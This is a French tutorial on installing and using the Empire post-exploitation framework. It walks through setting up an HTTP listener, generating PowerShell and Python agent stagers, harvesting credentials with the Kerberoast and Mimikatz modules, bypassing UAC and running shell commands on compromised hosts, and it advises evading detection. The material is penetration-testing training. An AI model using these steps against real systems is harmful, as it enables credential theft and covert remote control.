# Empire

## Empire - Framework de Post-Exploitation Open Source

***

### Introduction

**Empire** est un framework open-source conçu pour les phases de **post-exploitation** d'un test d'intrusion. Il permet de :

* Gérer des systèmes compromis via des agents (PowerShell ou Python).
* Collecter des informations sensibles (mots de passe, hashes).
* Escalader les privilèges.
* Exécuter des commandes sur des machines compromises.

Empire se distingue par sa flexibilité et son support natif de PowerShell et Python, en le rendant efficace pour cibler des environnements Windows, Linux et macOS.

***

### 🚀 Étape 1 : Installation d'Empire

#### Prérequis

1.  **Git** : Vérifiez si Git est installé :

    ```bash
    git --version
    ```

    Si non, installez-le :

    *   **Linux** :

        ```bash
        sudo apt install git
        ```
    *   **macOS** :

        ```bash
        brew install git
        ```
2.  **Python 3 et Pip** : Empire nécessite Python 3.7 ou supérieur. Vérifiez :

    ```bash
    python3 --version
    ```

    Installez-le si nécessaire :

    *   **Linux** :

        ```bash
        sudo apt install python3 python3-pip
        ```
    *   **macOS** :

        ```bash
        brew install python3
        ```

***

#### Installation sur Linux/macOS

1.  **Cloner le dépôt GitHub** :

    ```bash
    git clone https://github.com/EmpireProject/Empire.git
    ```
2.  **Se déplacer dans le répertoire cloné** :

    ```bash
    cd Empire
    ```
3.  **Lancer le script d’installation** :

    ```bash
    ./setup/install.sh
    ```

    * **Explication** :
      * Télécharge et installe toutes les dépendances nécessaires pour Empire.
4.  **Démarrer Empire** :

    ```bash
    ./empire
    ```
5. **Configurer une base de données SQLite (si demandé)** : Lors du premier lancement, Empire peut vous demander de configurer une base de données. Suivez les instructions à l’écran.

***

#### Installation sur Windows

Empire n'est pas conçu pour fonctionner nativement sur Windows. Utilisez une **machine virtuelle** ou un **sous-système Linux pour Windows (WSL)** pour l’exécuter.

**Étapes avec WSL :**

1. Installez WSL et configurez une distribution Linux (comme Ubuntu).
2. Lancez votre distribution Linux et suivez les étapes d'installation pour Linux ci-dessus.

***

### 🛠️ Étape 2 : Utilisation de Base d'Empire

***

#### 1. Démarrer Empire

*   **Commande** :

    ```bash
    ./empire
    ```
* **Explication** :
  * Lance l’interface de ligne de commande (CLI) d’Empire.
  * Vous accédez alors à une interface interactive où vous pouvez configurer des listeners, gérer des agents et exécuter des modules.

***

#### 2. Créer et Configurer un Listener

Les listeners sont utilisés pour accepter les connexions des agents sur les systèmes compromis.

1. **Afficher les options de listener disponibles** :
   *   Commande :

       ```bash
       listeners
       ```
   * **Explication** : Affiche les listeners actifs et disponibles.
2. **Créer un listener** :
   *   Commande :

       ```bash
       uselistener http
       ```
   * **Explication** : Utilise un listener basé sur HTTP.
3. **Configurer les paramètres du listener** :
   *   Tapez :

       ```bash
       set Host http://<your-ip>:<port>
       ```

       Remplacez `<your-ip>` par votre adresse IP et `<port>` par le port désiré.
4. **Démarrer le listener** :
   *   Commande :

       ```bash
       execute
       ```
   * **Explication** : Lance le listener pour accepter les connexions des agents.

***

#### 3. Générer un Agent

Un **agent** est un script qui, une fois exécuté sur un système cible, établit une connexion avec le listener.

1. **Créer un agent PowerShell (exemple)** :
   *   Commande :

       ```bash
       usestager windows/launcher_bat
       ```
   *   Configurez les options :

       ```bash
       set Listener <listener_name>
       execute
       ```
   * **Explication** : Génère un script PowerShell prêt à être exécuté sur le système cible.
2. **Générer un agent Python (exemple)** :
   *   Commande :

       ```bash
       usestager python/launcher
       ```
   * Configurez les options et exécutez comme précédemment.

***

#### 4. Surveiller les Agents

*   **Commande** :

    ```bash
    agents
    ```
* **Explication** :
  * Affiche la liste des agents actifs connectés à votre listener.

***

### 🔍 Étape 3 : Utilisation des Modules d'Empire

***

#### 1. Charger un Module

Empire propose une bibliothèque de modules pour accomplir diverses tâches comme :

* La collecte d’informations.
* L’escalade des privilèges.
* L’exécution de commandes.
*   **Commande** :

    ```bash
    usemodule powershell/credentials/gather/kerberoast
    ```
* **Explication** :
  * Charge un module pour récupérer les informations d'identification via des tickets Kerberos.

***

#### 2. Configurer et Exécuter un Module

1. **Afficher les options du module** :
   *   Commande :

       ```bash
       info
       ```
   * **Explication** : Affiche les paramètres du module.
2. **Configurer les options** :
   *   Exemple :

       ```bash
       set Target <agent_name>
       execute
       ```

***

### 📋 Étape 4 : Exemples Pratiques

***

#### 1. Collecter des Hashes de Mots de Passe

1. **Charger le module** :
   *   Commande :

       ```bash
       usemodule powershell/credentials/mimikatz/logonpasswords
       ```
2. **Configurer et exécuter** :
   * Configurez l’agent cible et exécutez.

***

#### 2. Exécuter des Commandes sur un Système Compromis

1. **Sélectionner un agent actif** :
   *   Commande :

       ```bash
       interact <agent_name>
       ```
2. **Envoyer une commande** :
   *   Exemple :

       ```bash
       shell whoami
       ```
   * **Explication** : Exécute la commande `whoami` sur le système compromis.

***

#### 3. Escalader les Privilèges

1. **Utiliser un module d’escalade** :
   *   Exemple :

       ```bash
       usemodule powershell/privesc/bypassuac
       ```
2. **Configurer et exécuter le module**.

***

### 📖 Bonnes Pratiques

1. **Évitez d'être détecté** :
   * Limitez l’utilisation de commandes bruyantes pour éviter d’alerter les systèmes de sécurité.
   * Configurez des options comme des délais entre les connexions.
2. **Testez uniquement avec autorisation** :
   * Obtenez les permissions nécessaires pour éviter des implications légales.
3. **Protégez vos agents** :
   *   Supprimez les agents inutilisés avec :

       ```bash
       kill <agent_name>
       ```
